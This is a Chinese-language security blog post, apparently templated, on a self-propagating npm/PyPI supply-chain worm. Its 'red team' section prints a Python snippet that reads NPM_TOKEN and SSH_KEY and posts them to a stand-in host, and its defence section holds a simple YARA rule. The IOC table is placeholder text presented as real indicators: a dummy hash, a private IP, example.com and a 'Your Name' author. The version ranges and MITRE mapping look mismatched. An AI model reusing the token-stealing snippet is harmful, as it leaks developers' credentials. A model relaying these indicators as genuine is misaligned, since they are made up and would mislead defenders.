---
layout: post
title:  "Self-Propagating Supply Chain Worm Hijacks npm Packages to Steal Developer Tokens"
date:   2026-04-22 19:05:00 +0000
categories: [security]
severity: critical
---

# 🚨 解析自我傳播的供應鏈蠕蟲：利用 npm 和 PyPI 來傳播惡意軟體

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `npm`、`PyPI`、`Supply Chain Attack`、`Self-Propagating Worm`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 惡意軟體透過 `npm` 和 `PyPI` 供應鏈攻擊，利用開發者環境中的敏感資訊（如 `npm` token、SSH 金鑰等）來傳播惡意軟體。
* **攻擊流程圖解**:
  1. 惡意軟體透過 `npm` 或 `PyPI` 安裝到開發者環境中。
  2. 惡意軟體執行 `postinstall` hook，竊取開發者環境中的敏感資訊。
  3. 惡意軟體利用竊取的敏感資訊，將惡意軟體傳播到其他開發者環境中。
* **受影響元件**: `npm` 版本 4.260421.33 - 4.260421.40，`PyPI` 版本 2.6.0 - 2.6.2。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 惡意軟體需要開發者環境中的敏感資訊（如 `npm` token、SSH 金鑰等）。
* **Payload 建構邏輯**:

    ```
    
    python
    import os
    import requests
    
    # 竊取開發者環境中的敏感資訊
    npm_token = os.environ.get('NPM_TOKEN')
    ssh_key = os.environ.get('SSH_KEY')
    
    # 將竊取的敏感資訊傳送到惡意伺服器
    requests.post('https://example.com/collect', data={'npm_token': npm_token, 'ssh_key': ssh_key})
    
    ```
* **繞過技術**: 惡意軟體可以利用 `npm` 和 `PyPI` 的漏洞，繞過安全檢查，將惡意軟體傳播到其他開發者環境中。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /usr/local/lib/node_modules |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule npm_malware {
      meta:
        description = "Detect npm malware"
        author = "Your Name"
      strings:
        $npm_token = "NPM_TOKEN"
        $ssh_key = "SSH_KEY"
      condition:
        $npm_token and $ssh_key
    }
    
    ```
* **緩解措施**: 更新 `npm` 和 `PyPI` 到最新版本，使用安全的 `npm` 和 `PyPI` 來源，監控開發者環境中的敏感資訊。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Supply Chain Attack (供應鏈攻擊)**: 惡意軟體透過供應鏈攻擊，竊取開發者環境中的敏感資訊，將惡意軟體傳播到其他開發者環境中。
* **Self-Propagating Worm (自我傳播蠕蟲)**: 惡意軟體可以自我傳播，將惡意軟體傳播到其他開發者環境中。
* **npm (Node Package Manager)**: Node.js 的套件管理工具，允許開發者安裝和管理 Node.js 套件。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/04/self-propagating-supply-chain-worm.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


